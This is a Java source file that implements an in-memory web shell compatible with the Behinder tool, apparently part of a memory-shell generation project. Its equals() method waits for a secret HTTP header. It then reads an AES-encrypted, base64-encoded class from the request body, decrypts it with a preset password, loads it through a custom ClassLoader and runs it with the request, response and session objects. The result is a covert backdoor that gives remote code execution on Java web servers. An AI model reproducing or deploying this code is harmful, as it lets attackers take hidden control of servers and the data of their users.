package com.reajason.javaweb.memshell.shelltool.behinder;

import java.io.BufferedReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.Key;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class Behinder extends ClassLoader {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public Behinder() {
    }

    public Behinder(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrapRequest(args[0]);
        Object response = unwrapResponse(args[1]);

        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                Map<String, Object> map = new HashMap<String, Object>(3);
                map.put("request", request);
                map.put("response", response);
                map.put("session", session);
                String parameter = ((BufferedReader) request.getClass().getMethod("getReader").invoke(request)).readLine();
                byte[] bytes = x(base64Decode(parameter));
                Object instance = (new Behinder(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(map);
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    public byte[] x(byte[] s) {
        try {
            Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
            Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
            Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
            Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
            Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
            initMethod.invoke(c, 2, constructor.newInstance(pass.getBytes(), "AES"));
            Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
            return ((byte[]) doFinalMethod.invoke(c, s));
        } catch (Exception ignored) {
            return null;
        }
    }


    public Object unwrapRequest(Object request) {
        Object internalRequest = request;
        while (true) {
            try {
                Object r = getFieldValue(request, "request");
                if (r == internalRequest) {
                    return r;
                } else {
                    internalRequest = r;
                }
            } catch (Exception e) {
                return internalRequest;
            }
        }
    }

    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public static Object invokeInternalMethod(Object obj, String methodName) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    method = clazz.getMethod(methodName);
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
